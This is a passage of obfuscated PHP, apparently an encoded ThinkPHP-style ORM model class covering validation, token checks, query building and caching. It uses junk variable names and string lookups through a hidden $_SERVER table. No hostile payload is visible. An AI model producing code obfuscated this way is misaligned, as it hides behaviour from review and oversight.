isset($this->updateFields)) { $ÏßÊØ¢ = $this->updateFields; } if (isset($ÏßÊØ¢)) { if (is_string($ÏßÊØ¢)) { $ÏßÊØ¢ = explode($ÎıùÛ¯Î[50], $ÏßÊØ¢); } if (think_config($ÎıùÛ¯Î[298])) { $ÏßÊØ¢[] = think_config($ÎıùÛ¯Î[299]); } foreach ($œ½ÍÔíá as $µÔ³Ñö  => $áĞ²Û) { if (!in_array($µÔ³Ñö , $ÏßÊØ¢)) { unset($œ½ÍÔíá[$µÔ³Ñö ]); } } } if (!$this->autoValidation($œ½ÍÔíá, $Øæ°ü¹¨)) { return !1; } if (!$this->autoCheckToken($œ½ÍÔíá)) { $this->error = think_lang($ÎıùÛ¯Î[300]); return !1; } if ($this->autoCheckFields) { $ÏßÊØ¢ = $this->getDbFields(); foreach ($œ½ÍÔíá as $µÔ³Ñö  => $áĞ²Û) { if (!in_array($µÔ³Ñö , $ÏßÊØ¢)) { unset($œ½ÍÔíá[$µÔ³Ñö ]); } elseif (MAGIC_QUOTES_GPC && is_string($áĞ²Û)) { $œ½ÍÔíá[$µÔ³Ñö ] = stripslashes($áĞ²Û); } } } $this->autoOperation($œ½ÍÔíá, $Øæ°ü¹¨); $this->data = $œ½ÍÔíá; return $œ½ÍÔíá; } public function autoCheckToken($Ú¼§ßç) { $úî¥ÌÔÎ =& $_SERVER[óó‹¸‚å]; if (isset($this->options[$úî¥ÌÔÎ[301]]) && !$this->options[$úî¥ÌÔÎ[301]]) { return !0; } if (think_config($úî¥ÌÔÎ[298])) { $ÚÓ¶ßÈ… = think_config($úî¥ÌÔÎ[299]); if (!isset($Ú¼§ßç[$ÚÓ¶ßÈ…]) || Session::get($ÚÓ¶ßÈ…)) { return !1; } list($…×´ˆ˜‘, $§­ú„ü¹) = explode($úî¥ÌÔÎ[11], $Ú¼§ßç[$ÚÓ¶ßÈ…]); if ($§­ú„ü¹ && Session::get($ÚÓ¶ßÈ… . $úî¥ÌÔÎ[10] . $…×´ˆ˜‘) === $§­ú„ü¹) { Session::remove($ÚÓ¶ßÈ… . $úî¥ÌÔÎ[10] . $…×´ˆ˜‘); return !0; } if (think_config($úî¥ÌÔÎ[302])) { Session::remove($ÚÓ¶ßÈ… . $úî¥ÌÔÎ[10] . $…×´ˆ˜‘); } return !1; } return !0; } public function regex($éÈ°œõ, $™¶Ê‹€) { $¡ß÷…‰° =& $_SERVER[óó‹¸‚å]; $ì¶ô¢Ìµ = array($¡ß÷…‰°[303] => $¡ß÷…‰°[304], $¡ß÷…‰°[305] => $¡ß÷…‰°[306], $¡ß÷…‰°[307] => $¡ß÷…‰°[308], $¡ß÷…‰°[309] => $¡ß÷…‰°[310], $¡ß÷…‰°[311] => $¡ß÷…‰°[312], $¡ß÷…‰°[313] => $¡ß÷…‰°[314], $¡ß÷…‰°[315] => $¡ß÷…‰°[316], $¡ß÷…‰°[290] => $¡ß÷…‰°[317], $¡ß÷…‰°[318] => $¡ß÷…‰°[319]); if (isset($ì¶ô¢Ìµ[strtolower($™¶Ê‹€)])) { $™¶Ê‹€ = $ì¶ô¢Ìµ[strtolower($™¶Ê‹€)]; } return preg_match($™¶Ê‹€, $éÈ°œõ) === 1; } private function autoOperation(&$ÙÀÒ ›, $ÆÎ¦œê) { $²Ø¼ÔÀ™ =& $_SERVER[óó‹¸‚å]; if (!empty($this->options[$²Ø¼ÔÀ™[320]])) { $„ŸĞÓ’ = $this->options[$²Ø¼ÔÀ™[320]]; unset($this->options[$²Ø¼ÔÀ™[320]]); } elseif (!empty($this->_auto)) { $„ŸĞÓ’ = $this->_auto; } if (isset($„ŸĞÓ’)) { foreach ($„ŸĞÓ’ as $Ğé„—­…) { if (empty($Ğé„—­…[2])) { $Ğé„—­…[2] = THINK_MODEL_INSERT; } if ($ÆÎ¦œê == $Ğé„—­…[2] || $Ğé„—­…[2] == THINK_MODEL_BOTH) { switch (trim($Ğé„—­…[3])) { case $²Ø¼ÔÀ™[321]: case $²Ø¼ÔÀ™[322]: $ñ–¤„‘¤ = isset($Ğé„—­…[4]) ? (array) $Ğé„—­…[4] : array(); if (isset($ÙÀÒ ›[$Ğé„—­…[0]])) { array_unshift($ñ–¤„‘¤, $ÙÀÒ ›[$Ğé„—­…[0]]); } if ($²Ø¼ÔÀ™[321] == $Ğé„—­…[3]) { $ÙÀÒ ›[$Ğé„—­…[0]] = call_user_func_array($Ğé„—­…[1], $ñ–¤„‘¤); } else { $ÙÀÒ ›[$Ğé„—­…[0]] = call_user_func_array(array(&$this, $Ğé„—­…[1]), $ñ–¤„‘¤); } break; case $²Ø¼ÔÀ™[273]: $ÙÀÒ ›[$Ğé„—­…[0]] = $ÙÀÒ ›[$Ğé„—­…[1]]; break; case $²Ø¼ÔÀ™[323]: if ($²Ø¼ÔÀ™[12] === $ÙÀÒ ›[$Ğé„—­…[0]]) { unset($ÙÀÒ ›[$Ğé„—­…[0]]); } break; case $²Ø¼ÔÀ™[324]: default: $ÙÀÒ ›[$Ğé„—­…[0]] = $Ğé„—­…[1]; } if (!1 === $ÙÀÒ ›[$Ğé„—­…[0]]) { unset($ÙÀÒ ›[$Ğé„—­…[0]]); } } } } return $ÙÀÒ ›; } protected function autoValidation($“ƒ‚ˆ‘», $â«¤•¯Ã) { $Í¬¶†å =& $_SERVER[óó‹¸‚å]; if (!empty($this->options[$Í¬¶†å[325]])) { $©è´«ïÏ = $this->options[$Í¬¶†å[325]]; unset($this->options[$Í¬¶†å[325]]); } elseif (!empty($this->_validate)) { $©è´«ïÏ = $this->_validate; } if (isset($©è´«ïÏ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($©è´«ïÏ as $ÎÌô‚ø => $Ëšë»¡Á) { if (empty($Ëšë»¡Á[5]) || $Ëšë»¡Á[5] == THINK_MODEL_BOTH || $Ëšë»¡Á[5] == $â«¤•¯Ã) { if (0 == strpos($Ëšë»¡Á[2], $Í¬¶†å[326]) && strpos($Ëšë»¡Á[2], $Í¬¶†å[327])) { $Ëšë»¡Á[2] = think_lang(substr($Ëšë»¡Á[2], 2, -1)); } $Ëšë»¡Á[3] = isset($Ëšë»¡Á[3]) ? $Ëšë»¡Á[3] : THINK_EXISTS_VALIDATE; $Ëšë»¡Á[4] = isset($Ëšë»¡Á[4]) ? $Ëšë»¡Á[4] : $Í¬¶†å[328]; switch ($Ëšë»¡Á[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($“ƒ‚ˆ‘», $Ëšë»¡Á)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($Í¬¶†å[12] != trim($“ƒ‚ˆ‘»[$Ëšë»¡Á[0]])) { if (!1 === $this->_validationField($“ƒ‚ˆ‘», $Ëšë»¡Á)) { return !1; } } break; default: if (isset($“ƒ‚ˆ‘»[$Ëšë»¡Á[0]])) { if (!1 === $this->_validationField($“ƒ‚ˆ‘», $Ëšë»¡Á)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($‡é‹¹², $‹·¡—Óß) { if (!1 === $this->_validationFieldItem($‡é‹¹², $‹·¡—Óß)) { if ($this->patchValidate) { $this->error[$‹·¡—Óß[0]] = $‹·¡—Óß[2]; } else { $this->error = $‹·¡—Óß[2]; return !1; } } return; } protected function _validationFieldItem($‚ŸÑ¶å¼, $±‘µö¨‰) { $óó«Ã„Á =& $_SERVER[óó‹¸‚å]; switch (strtolower(trim($±‘µö¨‰[4]))) { case $óó«Ã„Á[321]: case $óó«Ã„Á[322]: $„Ìù¨ŒÒ = isset($±‘µö¨‰[6]) ? (array) $±‘µö¨‰[6] : array(); if (is_string($±‘µö¨‰[0]) && strpos($±‘µö¨‰[0], $óó«Ã„Á[50])) { $±‘µö¨‰[0] = explode($óó«Ã„Á[50], $±‘µö¨‰[0]); } if (is_array($±‘µö¨‰[0])) { foreach ($±‘µö¨‰[0] as $¶¸ñ†ä) { $¹ığ¸±Ë[$¶¸ñ†ä] = $‚ŸÑ¶å¼[$¶¸ñ†ä]; } array_unshift($„Ìù¨ŒÒ, $¹ığ¸±Ë); } else { array_unshift($„Ìù¨ŒÒ, $‚ŸÑ¶å¼[$±‘µö¨‰[0]]); } if ($óó«Ã„Á[321] == $±‘µö¨‰[4]) { return call_user_func_array($±‘µö¨‰[1], $„Ìù¨ŒÒ); } else { return call_user_func_array(array(&$this, $±‘µö¨‰[1]), $„Ìù¨ŒÒ); } case $óó«Ã„Á[329]: return $‚ŸÑ¶å¼[$±‘µö¨‰[0]] == $‚ŸÑ¶å¼[$±‘µö¨‰[1]]; case $óó«Ã„Á[330]: if (is_string($±‘µö¨‰[0]) && strpos($±‘µö¨‰[0], $óó«Ã„Á[50])) { $±‘µö¨‰[0] = explode($óó«Ã„Á[50], $±‘µö¨‰[0]); } $Ê‡èòï = array(); if (is_array($±‘µö¨‰[0])) { foreach ($±‘µö¨‰[0] as $¶¸ñ†ä) { $Ê‡èòï[$¶¸ñ†ä] = $‚ŸÑ¶å¼[$¶¸ñ†ä]; } } else { $Ê‡èòï[$±‘µö¨‰[0]] = $‚ŸÑ¶å¼[$±‘µö¨‰[0]]; } if (!empty($‚ŸÑ¶å¼[$this->getPk()])) { $Ê‡èòï[$this->getPk()] = array($óó«Ã„Á[331], $‚ŸÑ¶å¼[$this->getPk()]); } if ($this->where($Ê‡èòï)->find()) { return !1; } return !0; default: return $this->check($‚ŸÑ¶å¼[$±‘µö¨‰[0]], $±‘µö¨‰[1], $±‘µö¨‰[4]); } } public function check($‚´‚Ûó¬, $Û¬úçÖ, $ÇÖ«Éš  = "\x72\x65\147\145\x78") { $ßÚ§ó’³ =& $_SERVER[óó‹¸‚å]; $ÇÖ«Éš  = strtolower(trim($ÇÖ«Éš )); switch ($ÇÖ«Éš ) { case $ßÚ§ó’³[7]: case $ßÚ§ó’³[332]: $½È„¹ğŠ = is_array($Û¬úçÖ) ? $Û¬úçÖ : explode($ßÚ§ó’³[50], $Û¬úçÖ); return $ÇÖ«Éš  == $ßÚ§ó’³[7] ? in_array($‚´‚Ûó¬, $½È„¹ğŠ) : !in_array($‚´‚Ûó¬, $½È„¹ğŠ); case $ßÚ§ó’³[333]: case $ßÚ§ó’³[334]: if (is_array($Û¬úçÖ)) { $û¢ÑÓÏİ = $Û¬úçÖ[0]; $ñãåÃ§ = $Û¬úçÖ[1]; } else { list($û¢ÑÓÏİ, $ñãåÃ§) = explode($ßÚ§ó’³[50], $Û¬úçÖ); } return $ÇÖ«Éš  == $ßÚ§ó’³[333] ? $‚´‚Ûó¬ >= $û¢ÑÓÏİ && $‚´‚Ûó¬ <= $ñãåÃ§ : $‚´‚Ûó¬ < $û¢ÑÓÏİ || $‚´‚Ûó¬ > $ñãåÃ§; case $ßÚ§ó’³[335]: case $ßÚ§ó’³[336]: return $ÇÖ«Éš  == $ßÚ§ó’³[335] ? $‚´‚Ûó¬ == $Û¬úçÖ : $‚´‚Ûó¬ != $Û¬úçÖ; case $ßÚ§ó’³[337]: $ƒ¦“â¹Â = mb_strlen($‚´‚Ûó¬, $ßÚ§ó’³[338]); if (strpos($Û¬úçÖ, $ßÚ§ó’³[50])) { list($û¢ÑÓÏİ, $ñãåÃ§) = explode($ßÚ§ó’³[50], $Û¬úçÖ); return $ƒ¦“â¹Â >= $û¢ÑÓÏİ && $ƒ¦“â¹Â <= $ñãåÃ§; } else { return $ƒ¦“â¹Â == $Û¬úçÖ; } case $ßÚ§ó’³[339]: list($èïÂëµ’, $õ«§ó¥Ú) = explode($ßÚ§ó’³[50], $Û¬úçÖ); if (!is_numeric($èïÂëµ’)) { $èïÂëµ’ = strtotime($èïÂëµ’); } if (!is_numeric($õ«§ó¥Ú)) { $õ«§ó¥Ú = strtotime($õ«§ó¥Ú); } return NOW_TIME >= $èïÂëµ’ && NOW_TIME <= $õ«§ó¥Ú; case $ßÚ§ó’³[340]: return in_array(get_client_ip(), explode($ßÚ§ó’³[50], $Û¬úçÖ)); case $ßÚ§ó’³[341]: return !in_array(get_client_ip(), explode($ßÚ§ó’³[50], $Û¬úçÖ)); case $ßÚ§ó’³[328]: default: return $this->regex($‚´‚Ûó¬, $Û¬úçÖ); } } public function query($Ãø¹«óç, $¡ÕüÀ²° = false) { $è÷¢Üı =& $_SERVER[óó‹¸‚å]; if (!is_bool($¡ÕüÀ²°) && !is_array($¡ÕüÀ²°)) { $¡ÕüÀ²° = func_get_args(); array_shift($¡ÕüÀ²°); } $Ãø¹«óç = str_replace(array($è÷¢Üı[231], $è÷¢Üı[342]), $è÷¢Üı[53], $Ãø¹«óç); $Ãø¹«óç = $this->parseSql($Ãø¹«óç, $¡ÕüÀ²°); return $this->db->query($Ãø¹«óç); } public function execute($–éèšÌ©, $Ê–ŠÇÇ¸ = false) { if (!is_bool($Ê–ŠÇÇ¸) && !is_array($Ê–ŠÇÇ¸)) { $Ê–ŠÇÇ¸ = func_get_args(); array_shift($Ê–ŠÇÇ¸); } $–éèšÌ© = $this->parseSql($–éèšÌ©, $Ê–ŠÇÇ¸); return $this->db->execute($–éèšÌ©); } protected function parseSql($¥Œ„–äÉ, $…Êë³ßÍ) { $¢Î×ÖØ =& $_SERVER[óó‹¸‚å]; if (!0 === $…Êë³ßÍ) { $áÉ­ç† = $this->_parseOptions(); $¥Œ„–äÉ = $this->db->parseSql($¥Œ„–äÉ, $áÉ­ç†); } elseif (is_array($…Êë³ßÍ)) { $…Êë³ßÍ = array_map(array($this->db, $¢Î×ÖØ[343]), $…Êë³ßÍ); $¥Œ„–äÉ = vsprintf($¥Œ„–äÉ, $…Êë³ßÍ); } else { $¥Œ„–äÉ = strtr($¥Œ„–äÉ, array($¢Î×ÖØ[344] => $this->getTableName(), $¢Î×ÖØ[345] => think_config($¢Î×ÖØ[244]))); } $this->db->setModel($this->name); return $¥Œ„–äÉ; } public function db($Äº›Œ¦Û = '', $”š¦ñÃì = '', $â±ÃÅµ = array()) { $—ì·ß·Ü =& $_SERVER[óó‹¸‚å]; if ($—ì·ß·Ü[12] === $Äº›Œ¦Û && $this->db) { return $this->db; } static $éä¾ãª³ = array(); static $ƒÓÏËÅ¦ = array(); if (!isset($ƒÓÏËÅ¦[$Äº›Œ¦Û]) || isset($ƒÓÏËÅ¦[$Äº›Œ¦Û]) && $”š¦ñÃì && $éä¾ãª³[$Äº›Œ¦Û] != $”š¦ñÃì) { if (!empty($”š¦ñÃì) && is_string($”š¦ñÃì) && !1 === strpos($”š¦ñÃì, $—ì·ß·Ü[8])) { $”š¦ñÃì = think_config($”š¦ñÃì); } $Äº›Œ¦Û = think_guid($”š¦ñÃì); $ƒÓÏËÅ¦[$Äº›Œ¦Û] = Db::getInstance($”š¦ñÃì); } elseif (NULL === $”š¦ñÃì) { $ƒÓÏËÅ¦[$Äº›Œ¦Û]->close(); unset($ƒÓÏËÅ¦[$Äº›Œ¦Û]); return; } if (!empty($â±ÃÅµ)) { if (is_string($â±ÃÅµ)) { parse_str($â±ÃÅµ, $â±ÃÅµ); } foreach ($â±ÃÅµ as $å¯³Ã‰À => $„¬¾²Íè) { $this->setProperty($å¯³Ã‰À, $„¬¾²Íè); } } $éä¾ãª³[$Äº›Œ¦Û] = $”š¦ñÃì; $this->db = $ƒÓÏËÅ¦[$Äº›Œ¦Û]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $Æ¯İÄùí = get_class($this); if ($Æ¯İÄùí == $_SERVER[óó‹¸‚å][346]) { return $this->name; } $this->name = substr($Æ¯İÄùí, 0, -5); } return $this->name; } public function getTableName() { $åšö§àÇ =& $_SERVER[óó‹¸‚å]; if (empty($this->trueTableName)) { $šÇ¹’ˆò = !empty($this->tablePrefix) ? $this->tablePrefix : $åšö§àÇ[12]; if (!empty($this->tableName)) { $šÇ¹’ˆò .= $this->tableName; } else { $šÇ¹’ˆò .= think_parse_name($this->name); } $this->trueTableName = strtolower($šÇ¹’ˆò); } return (!empty($this->dbName) ? $this->dbName . $åšö§àÇ[10] : $åšö§àÇ[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $İÅäÑÊ® =& $_SERVER[óó‹¸‚å]; return isset($this->fields[$İÅäÑÊ®[251]]) ? $this->fields[$İÅäÑÊ®[251]] : $this->pk; } public function getDbFields() { $¾¿ ÚÎ =& $_SERVER[óó‹¸‚å]; if (isset($this->options[$¾¿ ÚÎ[279]])) { $ÈçÈĞ¹à = $this->db->getFields($this->options[$¾¿ ÚÎ[279]]); return $ÈçÈĞ¹à ? array_keys($ÈçÈĞ¹à) : !1; } if ($this->fields) { $ÈçÈĞ¹à = $this->fields; unset($ÈçÈĞ¹à[$¾¿ ÚÎ[250]], $ÈçÈĞ¹à[$¾¿ ÚÎ[251]], $ÈçÈĞ¹à[$¾¿ ÚÎ[252]], $ÈçÈĞ¹à[$¾¿ ÚÎ[249]]); return $ÈçÈĞ¹à; } return !1; } public function data($Ø“êËô = '') { $¢‹Ïäå =& $_SERVER[óó‹¸‚å]; if ($¢‹Ïäå[12] === $Ø“êËô && !empty($this->data)) { return $this->data; } if (is_object($Ø“êËô)) { $Ø“êËô = get_object_vars($Ø“êËô); } elseif (is_string($Ø“êËô)) { parse_str($Ø“êËô, $Ø“êËô); } elseif (!is_array($Ø“êËô)) { think_exception(think_lang($¢‹Ïäå[271])); } $this->data = $Ø“êËô; return $this; } public function join($ü¥³åĞŠ) { $•¾ÅŞ‹í =& $_SERVER[óó‹¸‚å]; if (is_array($ü¥³åĞŠ)) { $this->options[$•¾ÅŞ‹í[282]] = $ü¥³åĞŠ; } elseif (!empty($ü¥³åĞŠ)) { $this->options[$•¾ÅŞ‹í[282]][] = $ü¥³åĞŠ; } return $this; } public function union($ ¢‘˜…Å, $ô“¾ˆÊ¢ = false) { $ü¦®ÍÄ =& $_SERVER[óó‹¸‚å]; if (empty($ ¢‘˜…Å)) { return $this; } if ($ô“¾ˆÊ¢) { $this->options[$ü¦®ÍÄ[347]][$ü¦®ÍÄ[348]] = !0; } if (is_object($ ¢‘˜…Å)) { $ ¢‘˜…Å = get_object_vars($ ¢‘˜…Å); } if (is_string($ ¢‘˜…Å)) { $‹–œÜ˜ = $ ¢‘˜…Å; } elseif (is_array($ ¢‘˜…Å)) { if (isset($ ¢‘˜…Å[0])) { $this->options[$ü¦®ÍÄ[347]] = array_merge($this->options[$ü¦®ÍÄ[347]], $ ¢‘˜…Å); return $this; } else { $‹–œÜ˜ = $ ¢‘˜…Å; } } else { think_exception(think_lang($ü¦®ÍÄ[271])); } $this->options[$ü¦®ÍÄ[347]][] = $‹–œÜ˜; return $this; } public function cache($‡‹÷ü¨º = true, $÷¸ŒÌ²è = null, $¾û®î®ë = '') { $§¯î±Ğ =& $_SERVER[óó‹¸‚å]; if (!1 !== $‡‹÷ü¨º) { $this->options[$§¯î±Ğ[349]] = array($§¯î±Ğ[94] => $‡‹÷ü¨º, $§¯î±Ğ[339] => $÷¸ŒÌ²è, $§¯î±Ğ[33] => $¾û®î®ë); } return $this; } public function field($ê•×ñ», $½‰ôšüø = false) { $·àèÛÒï =& $_SERVER[óó‹¸‚å]; if (!0 === $ê•×ñ») { $Ô‘²Ğ¬Î = $this->getDbFields(); $ê•×ñ» = $Ô‘²Ğ¬Î ? $Ô‘²Ğ¬Î : $·àèÛÒï[188]; } elseif ($½‰ôšüø) { if (is_string($ê•×ñ»)) { $ê•×ñ» = explode($·àèÛÒï[50], $ê•×ñ»); } $Ô‘²Ğ¬Î = $this->getDbFields(); $ê•×ñ» = $Ô‘²Ğ¬Î ? array_diff($Ô‘²Ğ¬Î, $ê•×ñ») : $ê•×ñ»; } $this->options[$·àèÛÒï[273]] = $ê•×ñ»; return $this; } public function scope($œ²É¡ƒ© = '', $Ş´…øŸ = NULL) { $â‘ÜïÑ¸ =& $_SERVER[óó‹¸‚å]; if ($â‘ÜïÑ¸[12] === $œ²É¡ƒ©) { if (isset($this->_scope[$â‘ÜïÑ¸[37]])) { $°Ğ¸¡¡ı = $this->_scope[$â‘ÜïÑ¸[37]]; } else { return $this; } } elseif (is_string($œ²É¡ƒ©)) { $¸±ˆğ…è = explode($â‘ÜïÑ¸[50], $œ²É¡ƒ©); $°Ğ¸¡¡ı = array(); foreach ($¸±ˆğ…è as $Èİâ®İë) { if (!isset($this->_scope[$Èİâ®İë])) { continue; } $°Ğ¸¡¡ı = array_merge($°Ğ¸¡¡ı, $this->_scope[$Èİâ®İë]); } if (!empty($Ş´…øŸ) && is_array($Ş´…øŸ)) { $°Ğ¸¡¡ı = array_merge($°Ğ¸¡¡ı, $Ş´…øŸ); } } elseif (is_array($œ²É¡ƒ©)) { $°Ğ¸¡¡ı = $œ²É¡ƒ©; } if (is_array($°Ğ¸¡¡ı) && !empty($°Ğ¸¡¡ı)) { $this->options = array_merge($this->options, array_change_key_case($°Ğ¸¡¡ı)); } return $this; } public function where($ —Š«ºº, $ÃÄ¥ ¤¬ = null) { $ó¨Æ…ë =& $_SERVER[óó‹¸‚å]; if (!is_null($ÃÄ¥ ¤¬) && is_string($ —Š«ºº)) { if (!is_array($ÃÄ¥ ¤¬)) { $ÃÄ¥ ¤¬ = func_get_args(); array_shift($ÃÄ¥ ¤¬); } $ÃÄ¥ ¤¬ = array_map(array($this->db, $ó¨Æ…ë[343]), $ÃÄ¥ ¤¬); $ —Š«ºº = vsprintf($ —Š«ºº, $ÃÄ¥ ¤¬); } elseif (is_object($ —Š«ºº)) { $ —Š«ºº = get_object_vars($ —Š«ºº); } elseif (is_array($ —Š«ºº)) { foreach ($ —Š«ºº as $ø·æ¹¡ => $°€ÕŸ”í) { if ((is_numeric($ø·æ¹¡) || !$ø·æ¹¡) && is_string($°€ÕŸ”í)) { if (strpos($°€ÕŸ”í, $ó¨Æ…ë[350]) === 0) { continue; } think_trace($ó¨Æ…ë[351], $ó¨Æ…ë[12], $ó¨Æ…ë[49]); die; } } } if (is_string($ —Š«ºº) && $ó¨Æ…ë[12] != $ —Š«ºº) { $”‹«»Ê = array(); $”‹«»Ê[$ó¨Æ…ë[352]] = $ —Š«ºº; $ —Š«ºº = $”‹«»Ê; } if (isset($this->options[$ó¨Æ…ë[275]])) { $this->options[$ó¨Æ…ë[275]] = array_merge($this->options[$ó¨Æ…ë[275]], $ —Š«ºº); } else { $this->options[$ó¨Æ…ë[275]] = $ —Š«ºº; } return $this; } public function limit($ÚÖÊ‡×¤, $Ä½şê§ä = null) { $ê§ë£ø =& $_SERVER[óó‹¸‚å]; $this->options[$ê§ë£ø[292]] = is_null($Ä½şê§ä) ? $ÚÖÊ‡×¤ : $ÚÖÊ‡×¤ . $ê§ë£ø[50] . $Ä½şê§ä; return $this; } public function page($¡¤ÌÊÓ«, $¯Ä šº = null) { $æÂ÷µğ³ =& $_SERVER[óó‹¸‚å]; $this->options[$æÂ÷µğ³[353]] = is_null($¯Ä šº) ? $¡¤ÌÊÓ« : $¡¤ÌÊÓ« . $æÂ÷µğ³[50] . $¯Ä šº; return $this; } public function comment($ä‘²À½¾) { $this->options[$_SERVER[óó‹¸‚å][354]] = $ä‘²À½¾; return $this; } public function setProperty($±Ó™îÀ, $şã²›¿ö) { if (property_exists($this, $±Ó™îÀ)) { $this->{$±Ó™îÀ} = $şã²›¿ö; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\144\151\146\x79\x54\151\x6d\x65", "\x74\x69\155\x65", "\x69\156\x73\145\x72\x74\54\x75\x70\144\141\164\x65", "\146\x75\x6e\x63\164\x69\x6f\x6e"), array("\143\162\145\x61\x74\145\x54\x69\155\145", "\164\151\155\x65", "\151\x6e\163\x65\x72\x74", "\146\165\x6e\x63\164\x69\x6f\x6e")); public function setDataAuto($Â‹ÆÏ™û) { $this->dataAuto = $Â‹ÆÏ™û; } public function __construct($ ¿¯ÌË€ = '', $š”›¯½‡ = '', $ªÌèÖúı = '') { parent::__construct($ ¿¯ÌË€, $š”›¯½‡, $ªÌèÖúı); } protected $tableMeta = array(); protected function _beforeInsert(&$ã¿ñßÑ, $™ÉØÀŒì) { $à—“¤“ş =& $_SERVER[óó‹¸‚å]; if (!$this->checkDataAutoHas($à—“¤“ş[355])) { return; } $this->dataBeforeFilter($ã¿ñßÑ, $à—“¤“ş[355]); } protected function _beforeUpdate(&$°®ğ¹Ò, $É à‰ãƒ) { $ÃäâÍ» =& $_SERVER[óó‹¸‚å]; if (!$this->checkDataAutoHas($ÃäâÍ»[356])) { return; } $this->dataBeforeFilter($°®ğ¹Ò, $ÃäâÍ»[356]); } protected function _afterSelect(&$©„Ç»Ü‚, $÷Ù·åÉ°) { if (!is_array($©„Ç»Ü‚)) { return; } if (!$this->checkDataAutoHas($_SERVER[óó‹¸‚å][357])) { return; } foreach ($©„Ç»Ü‚ as &$—›íŒõÀ) { $this->dataAfterFilter($—›íŒõÀ); } unset($—›íŒõÀ); } protected function _afterFind(&$ª’¯Ëæ¹, $—ú²šÂ©) { if (!is_array($ª’¯Ëæ¹)) { return; } if (!$this->checkDataAutoHas($_SERVER[óó‹¸‚å][357])) { return; } $this->dataAfterFilter($ª’¯Ëæ¹); } public static function textEncode($ÔÏÂÀ‚) { if (!$ÔÏÂÀ‚) { return $ÔÏÂÀ‚; } $ë¨ï¤¶¢ = json_encode($ÔÏÂÀ‚); $ë¨ï¤¶¢ = preg_replace_callback($_SERVER[óó‹¸‚å][358], function ($öÄû’Ú¤) { return addslashes($öÄû’Ú¤[0]); }, $ë¨ï¤¶¢); return json_decode($ë¨ï¤¶¢); } public static function textDecode($Ø£Ô™–š) { $‡Ôù˜˜ğ =& $_SERVER[óó‹¸‚å]; $ÂµÈşŠì = json_encode($Ø£Ô™–š); $ÂµÈşŠì = preg_replace_callback($‡Ôù˜˜ğ[359], function ($ŒµÁŞ¤Ã) { return $_SERVER[óó‹¸‚å][97]; }, $ÂµÈşŠì); return json_decode($ÂµÈşŠì); } public function setAutoIncrement($ö¡¹öÓİ) { $¦‹†Æ¢¡ = array($this->getPk() => $ö¡¹öÓİ); $±‰ÀÒÔ = $this->data($¦‹†Æ¢¡)->add(); if ($±‰ÀÒÔ) { $this->delete($±‰ÀÒÔ); } } public function getAutoIncrement() { $¡şà¶Û» = $this->getTableName(); $½Í”¡ˆ = $this->max($this->getPk()); $à¡Ñ‡ã‰ = $this->query("\163\150\157\x77\x20\164\141\142\154\x65\x20\x73\x74\141\x74\x75\x73\x20\x77\150\145\162\145\x20\x4e\141\155\145\x3d\x27{$¡şà¶Û»}\47"); $¾ïÎ–Í = $à¡Ñ‡ã‰[0][$_SERVER[óó‹¸‚å][360]]; $¬ÈäÙ± = max($½Í”¡ˆ, $¾ïÎ–Í); return $¬ÈäÙ±; } protected function _callBefore($Ò½„îˆª, $×”ÃÓÇê) { return $this->cacheCallCheck($Ò½„îˆª, $×”ÃÓÇê, !1); } protected function _callAfter($ç¹öûõÇ, $©üÇ±çÎ) { return $this->cacheCallCheck($ç¹öûõÇ, $©üÇ±çÎ, !0); } protected function cacheFunctionAlias($ù™è×„É) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($øŒí©ï, $ê€áÌ¯§, $à¼Æè¢ = false) { $ÌÇÅ• = $this->cacheFunctionAlias($ê€áÌ¯§); if (!$ÌÇÅ•) { return; } foreach ($ÌÇÅ• as $±ÈøÕæ½ => $Øµİô…È) { $«åó½Š÷ = $Øµİô…È[0]; $¼İå¤ô = explode($_SERVER[óó‹¸‚å][50], $Øµİô…È[1]); if ($øŒí©ï == $±ÈøÕæ½) { return $this->cacheFunctionGet($±ÈøÕæ½, $«åó½Š÷); } if ($à¼Æè¢ && in_array($øŒí©ï, $¼İå¤ô)) { $this->cacheFunctionClear($±ÈøÕæ½, $«åó½Š÷); } } } public function cacheFunctionGet($éœ°Õêİ, $óºÙÂÃ) { $¡Óş“—ñ = $this->cacheKeyMake($éœ°Õêİ, $óºÙÂÃ); $Ë½Ò¯Éú = Cache::get($¡Óş“—ñ); if (!is_array($Ë½Ò¯Éú)) { $Ë½Ò¯Éú = call_user_func_array(array($this, $éœ°Õêİ), array($óºÙÂÃ, !0)); Cache::set($¡Óş“—ñ, $Ë½Ò¯Éú); } return $Ë½Ò¯Éú; } public function cacheFunctionClear($Œõ…†ä´, $€±Û½¨à) { $‘ÅÍóú­ = $€±Û½¨à; if (!is_array($€±Û½¨à)) { $‘ÅÍóú­ = array($€±Û½¨à); } foreach ($‘ÅÍóú­ as $ÔÑªêÖì) { $÷•¿¦ıù = $this->cacheKeyMake($Œõ…†ä´, $ÔÑªêÖì); Cache::remove($÷•¿¦ıù); } } private function cacheKeyMake($·Üêº°ö, $¶€şßˆå) { $¿  ±© =& $_SERVER[óó‹¸‚å]; return get_class($this) . $¿  ±©[11] . $·Üêº°ö . $¿  ±©[361] . $¶€şßˆå; } protected function selectPageReset() { $Èë±Å± =& $_SERVER[óó‹¸‚å]; if (isset($GLOBALS[$Èë±Å±[362]])) { return; } $GLOBALS[$Èë±Å±[362]] = isset($GLOBALS[$Èë±Å±[7]][$Èë±Å±[363]]) ? $GLOBALS[$Èë±Å±[7]][$Èë±Å±[363]] : !1; $GLOBALS[$Èë±Å±[364]] = isset($GLOBALS[$Èë±Å±[7]][$Èë±Å±[353]]) ? $GLOBALS[$Èë±Å±[7]][$Èë±Å±[353]] : !1; $GLOBALS[$Èë±Å±[7]][$Èë±Å±[363]] = 